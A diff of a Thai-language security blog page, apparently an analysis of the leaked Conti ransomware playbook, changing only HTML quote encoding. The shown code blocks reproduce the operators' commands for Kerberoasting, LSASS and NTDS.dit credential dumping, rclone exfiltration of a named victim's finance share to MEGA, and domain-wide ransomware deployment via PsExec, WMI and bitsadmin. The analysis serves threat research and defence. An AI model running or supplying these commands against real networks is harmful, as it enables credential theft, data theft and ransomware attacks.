@@ -535,7 +535,7 @@ powershell-import /home/user/work/Invoke-Kerberoast.ps1
 psinject 4728 x64 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath C:\ProgramData\pshashes.txt -append -force -Encoding UTF8
 
 // Method 2
-execute-assembly /home/user/work/Rubeus.exe kerberoast /ldapfilter: 'admincount = 1' / format:hashcat /outfile:C:\ProgramData\hashes.txt
+execute-assembly /home/user/work/Rubeus.exe kerberoast /ldapfilter: &#39;admincount = 1&#39; / format:hashcat /outfile:C:\ProgramData\hashes.txt
 execute-assembly /home/user/work/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
 </code></pre><ul>
 <li>ใช้ mimikatz โดยใช้ฟังก์ชัน <code>sekurlsa::logonpasswords</code> และ <code>lsadump::sam</code> รวมไปถึง <code>lsadump::dcsync</code> เพื่อใช้เทคนิค DCSync</li>
@@ -551,7 +551,7 @@ execute-assembly /home/user/work/Rubeus.exe asreproast /format:hashcat /outfile:
 shell rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump &lt;PID&gt; C:\ProgramData\lsass.dmp full
 
 // Method 2: via wmic
-shell wmic /node:&lt;target&gt; process call create &quot;cmd /c rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump &lt;PID&gt; C:\ProgramData\lsass.dmp full&quot;
+shell wmic /node:&lt;target&gt; process call create &#34;cmd /c rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump &lt;PID&gt; C:\ProgramData\lsass.dmp full&#34;
 
 // Method 3: via PsExec
 remote-exec psexec &lt;target&gt; cmd /c rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump &lt;PID&gt; C:\ProgramData\lsass.dmp full
@@ -566,10 +566,10 @@ remote-exec psexec &lt;target&gt; cmd /c rundll32.exe C:\Windows\System32\comsvc
 <li>ทำสำเนาไฟล์ NTDS ออกมา จุดน่าสนใจในส่วนนี้คือเทคนิคที่ใช้ในการสร้างสำเนาไฟล์ คู่มือของ Conti ระบุให้ใช้ฟีเจอร์ Volume Shadow Copies ในการสร้างสำเนาจากนั้นทำการคัดลอกสำเนาจากพาธของ Volume Shadow Copies ออกมา <strong>เทคนิคนี้เป็นเทคนิคเดียวกันกับช่องโหว่ HiveNightmare หรือ SeriousSAM ซึ่งพึ่งถูกเปิดเผยเมื่อต้นเดือนสิงหาคม 2021</strong></li>
 </ul>
 <pre tabindex="0"><code>// Step 1: Create a shadow copy
-shell wmic /node:&quot;DC01&quot; /user:&quot;DOMAIN\admin&quot; /password:&quot;cleartextpass&quot; process call create &quot;cmd /c vssadmin create shadow /for=C:\ 2&gt;&amp;1&quot;
+shell wmic /node:&#34;DC01&#34; /user:&#34;DOMAIN\admin&#34; /password:&#34;cleartextpass&#34; process call create &#34;cmd /c vssadmin create shadow /for=C:\ 2&gt;&amp;1&#34;
 
 // Step 2: Copy the shadow copy out
-shell wmic /node:&quot;DC01&quot; /user:&quot;DOMAIN\admin&quot; /password:&quot;cleartextpass&quot; process call create &quot;cmd / c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ &amp; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ &amp; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\
+shell wmic /node:&#34;DC01&#34; /user:&#34;DOMAIN\admin&#34; /password:&#34;cleartextpass&#34; process call create &#34;cmd / c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ &amp; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ &amp; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\
 
 // Step 3: Compress for exfiltrating
 7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD
@@ -586,7 +586,7 @@ shell wmic /node:&quot;DC01&quot; /user:&quot;DOMAIN\admin&quot; /password:&quot
 <li>สร้างไฟล์การตั้งค่าสำหรับโปรแกรม <a href="https://rclone.org/">rclone</a> เพื่อให้สามารถอัปโหลดข้อมูลไปยังบริการ MEGA ได้</li>
 <li>เริ่มทำการอัปโหลดโดยใช้โปรแกรม rclone ตัวอย่างคำสั่งที่ใช้ในการอัปโหลดตามตัวอย่างด้านล่าง (มีการแนะนำให้อ่านคู่มือของ rclone เพื่อเรียนรู้พารามิเตอร์อื่น ๆ ที่อาจใช้เพื่อประสิทธิภาพในการอัปโหลดไฟล์)</li>
 </ol>
-<pre tabindex="0"><code>shell rclone.exe copy &quot;\\WTFINANCE.washoetribe.net\E$\FINANCE&quot; mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 1 --transfers 3 --bwlimit 5M
+<pre tabindex="0"><code>shell rclone.exe copy &#34;\\WTFINANCE.washoetribe.net\E$\FINANCE&#34; mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 1 --transfers 3 --bwlimit 5M
 </code></pre><ol>
 <li>ในกรณีของการนำไฟล์ออกจากเซิร์ฟเวอร์แบบแยกเดี่ยว คู่มือมีการแนะนำให้ติดตั้งโปรแกรม MEGA Sync ของบริการ MEGA เพื่อทำการอัปโหลดข้อมูลเช่นเดียวกัน</li>
 <li>สร้างชุดข้อมูลสำหรับการข่มขู่โดยเน้นไปที่การหาข้อมูลบัญชีหรือประวัติการทำธุรกรรมย้อนหลัง เน้นไปที่ข้อมูลที่มีคีย์เวิร์ด อาทิ cyber, policy, insurance, endorsement, supplementary, underwriting, terms, bank, 2020, 2021 และ Statement จากนั้นทำสำเนาข้อมูลเหล่านี้พร้อมรายการแยกออกมาจากข้อมูลที่มีอยู่ใน MEGA</li>
@@ -594,13 +594,13 @@ shell wmic /node:&quot;DC01&quot; /user:&quot;DOMAIN\admin&quot; /password:&quot
 <h3 id="413-deploying-locker">4.1.3 Deploying Locker</h3>
 <p>ในส่วนสุดท้ายที่ปรากฎในชุดข้อมูล ผู้ปฏิบัติการจะได้รับคำสั่งให้เตรียมพร้อมเพื่อการติดตั้งและเริ่มการทำงานมัลแวร์เรียกค่าไถ่ ขั้นตอนในส่วนนี้จะเริ่มต้นโดยการใช้ระบบซึ่งทำหน้าที่เป็น domain controller เป็นจุดในการกระจายไฟล์โปรแกรมของมัลแวร์เรียกค่าไถ่ไปยังระบบที่อยู่ในโดเมนเดียวกัน ช่องทางของการแพร่กระจายไฟล์โปรแกรมนั้นเกิดขึ้นผ่านโปรโตคอล SMB และการใช้ฟีเจอร์ Background Intelligent Transfer Service (BITS) เข้ามาช่วย คู่มือระบุให้ทำการสร้างไฟล์สคริปต์เพื่อดำเนินการในขั้นตอนนี้โดยให้แยกตามลักษณะของโปรโตคอลหรือฟังก์ชันที่ใช้ ตามตัวอย่างด้านล่าง</p>
 <pre tabindex="0"><code>// Copying ransomware payload across the entire domain
-start PsExec.exe /accepteula @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c COPY &quot;\\PRIMARY_DOMAIN_CONTROLLER\share$\fx166.exe&quot; &quot;C:\windows\temp\ &quot;
+start PsExec.exe /accepteula @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c COPY &#34;\\PRIMARY_DOMAIN_CONTROLLER\share$\fx166.exe&#34; &#34;C:\windows\temp\ &#34;
 
 // Executing ransomware payload across the entire domain
 start PsExec.exe -d @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c c:\windows\temp\fx166.exe
 
 // Copying and executing with WMI and Bitsadmin
-start wmic /node:@C:\share$\comps1.txt /user:&quot;DOMAIN \Administrator&quot; /password:&quot;PASSWORD&quot; process call create &quot;cmd.exe /c bitsadmin /transfer fx166 \\DOMAIN_CONTROLLER\share$\fx166.exe %APPDATA%\fx166.exe &amp; %APPDATA%\fx166.exe &quot;
+start wmic /node:@C:\share$\comps1.txt /user:&#34;DOMAIN \Administrator&#34; /password:&#34;PASSWORD&#34; process call create &#34;cmd.exe /c bitsadmin /transfer fx166 \\DOMAIN_CONTROLLER\share$\fx166.exe %APPDATA%\fx166.exe &amp; %APPDATA%\fx166.exe &#34;
 </code></pre><p>นอกเหนือจากการกระจายและเอ็กซีคิวต์โปรแกรมของมัลแวร์เรียกค่าไถ่ คู่มือยังระบุถึงการปิดการทำงานของโปรแกรมป้องกันมัลแวร์ในระบบด้วย (น่าจะบอกก่อนที่จะปล่อย)</p>
 <p>สุดท้ายเมื่อโปรแกรมของมัลแวร์เรียกค่าไถ่ทำงานเสร็จสิ้น ผู้ปฏิบัติการจะต้องจัดเตรียมรายการปฏิบัติการตามตัวอย่างด้านล่าง</p>
 <pre tabindex="0"><code>Example:
